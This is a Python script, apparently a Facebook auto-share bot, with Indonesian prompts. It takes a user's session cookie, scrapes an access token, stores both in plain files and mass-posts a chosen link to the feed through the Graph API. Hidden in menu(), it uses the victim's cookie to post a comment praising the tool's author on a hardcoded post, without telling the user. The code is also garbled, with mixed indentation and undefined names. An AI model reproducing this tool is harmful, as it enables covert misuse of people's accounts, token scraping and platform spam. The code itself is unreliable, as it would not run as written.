import os, re, requests, json, bs4
from bs4 import BeautifulSoup as parser
ses=requests.Session()

def login():
	cookie = input(" masukan cookie : ")
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("token.txt", "w").write(find_token.group(1))
		open("cookie.txt", "w").write(cookie)
		menu()
	except:
		os.system("rm token.txt cookie.txt")
		exit(" login gagal kemungkinan cookie invalid atau tumbal mati")
		
	
def menu():
	try:
		token = open("token.txt","r").read()
		cok = open("cookie.txt","r").read()
		cookie = {"cookie":cok}
		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
	except:
           pass
        try:
           kmn=ses.get("https://www.facebook.com/muhammad.firza.75055/posts/pfbid0zfEVEX9UP1cdvnAGSwD9xb83gWn3t6Uy2Xcf1R2krczdJ7neRJQsSCvqiw21g34el",cookies=cokie).text
           kmn=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           dt=kmn.find_all("input",type="hidden")
           text=["Hi bang Ikfar tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ikfar-Bot","semoga rejeki bang Ikfar di lancarin amin","tools yang sangat bagus!","be yourself and never surrender"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(kmn["action"]),data={"fb_dtsg":dt[0]["value"],"jazoest":dt[1]["value"],"comment_text":random_komen},cookies=cokie)
	except:
           pass
		login()
	print(f" selamat datang {nama}, silahkan pakai sesuka hati")
	idt = input(" masukan link : ")
	limit = int(input(" masukan limit : "))
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
		for x in range(limit):
			n+=1
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				print(f" {n}. berhasil membagikan {data['id']}")
			else:
				exit(" gagal membagikan, kemungkinan token invalid")
	except:
		exit(" gagal membagikan, kemungkinan token invalid")
		
menu()
